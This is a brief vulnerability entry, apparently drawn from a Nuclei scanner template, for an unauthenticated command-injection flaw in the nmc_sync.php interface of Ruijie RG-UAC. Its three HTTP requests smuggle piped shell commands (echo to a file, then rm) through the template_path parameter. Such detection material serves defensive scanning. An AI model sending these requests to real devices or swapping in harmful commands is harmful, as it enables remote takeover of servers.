# Vulnerability: Ruijie RG-UAC nmc_sync.php - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`ruijie-nmc-sync-rce.yaml`)

## Description
There is a command execution vulnerability in the nmc_sync.php interface of Ruijie's RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo+{{match_str}}+>+{{random_str}}.txt|cat HTTP/1.1
Host: {{Hostname}}

GET /view/systemConfig/management/{{random_str}}.txt HTTP/1.1
Host: {{Hostname}}

GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|rm+{{random_str}}.txt|cat HTTP/1.1
Host: {{Hostname}}
```

